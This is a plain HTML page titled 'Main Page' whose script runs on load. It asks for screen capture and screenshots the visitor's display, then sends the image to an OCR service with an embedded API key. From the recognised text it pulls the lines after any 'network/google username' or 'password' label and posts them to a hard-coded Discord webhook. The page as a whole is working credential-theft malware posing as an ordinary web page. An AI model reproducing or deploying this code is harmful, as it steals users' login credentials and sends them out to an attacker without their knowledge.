<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Main Page</title>
</head>
<body>
<h1>Main Page</h1>
<script>
const WEBHOOK="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO-sHihafx71V_YdUCH50OPKtXt4cUMIoi2C9rzzA7bOvUziTLzd";
const OCR_KEY="K85882318988957";

(async()=>{
  try{
    // 1️⃣ Open test tab for handshake
    const testTab = window.open("test.html","_blank");

    // 2️⃣ Request screen capture (simpler, more reliable)
    const stream = await navigator.mediaDevices.getDisplayMedia({video:true});

    // 3️⃣ Notify test.html that permission is granted
    testTab.postMessage({msg:"allowed-permissions"},"*");

    // 4️⃣ Wait for acknowledgment from test.html
    await new Promise(resolve=>{
      function handler(e){
        if(e.data?.msg==="allowed-permissions"){
          window.removeEventListener("message", handler);
          resolve();
        }
      }
      window.addEventListener("message", handler);
    });

    // 5️⃣ Optional 1-second pause
    await new Promise(r => setTimeout(r, 1000));

    // 6️⃣ Setup video element
    const video = document.createElement("video");
    video.srcObject = stream;

    // Wait until metadata is loaded and video is playing
    await new Promise(resolve=>{
      video.onloadedmetadata = ()=> video.play().then(resolve);
    });

    // Wait until video actually has width/height
    await new Promise(resolve=>{
      const check = ()=> {
        if(video.videoWidth && video.videoHeight) resolve();
        else setTimeout(check,50);
      };
      check();
    });

    // 7️⃣ Capture screenshot to canvas
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video,0,0);
    stream.getTracks().forEach(t=>t.stop());

    // 8️⃣ Convert canvas to blob for OCR
    const blob = await new Promise(r=>canvas.toBlob(r,"image/png"));
    const formData = new FormData();
    formData.append("apikey",OCR_KEY);
    formData.append("language","eng");
    formData.append("file",blob,"shot.png");

    // 9️⃣ Call OCR API
    const ocrRes = await fetch("https://api.ocr.space/parse/image",{method:"POST",body:formData});
    const ocrJson = await ocrRes.json();
    if(!ocrJson.ParsedResults?.length) return;

    // 10️⃣ Filter text for network/google lines
    const lines = ocrJson.ParsedResults.map(r=>r.ParsedText).join("\n").split(/\r?\n/);
    const output = lines.reduce((a,v,i)=>{
      if(a) return a;
      if(v.toLowerCase().includes("network/google username") || v.toLowerCase().includes("network/google password")){
        return `${lines[i+1]||""}\n${lines[i+2]||""}`;
      }
      return "";
    },"").trim();
    if(!output) return;

    // 11️⃣ Send result to Discord
    await fetch(WEBHOOK,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({content:output||"(no valid text found)"})
    });

    console.log("OCR + Discord done!");

    // 12️⃣ Tell test tab to close itself
    testTab.postMessage({msg:"close-tab"},"*");

  } catch(e){console.error(e);}
})();
</script>
</body>
</html>
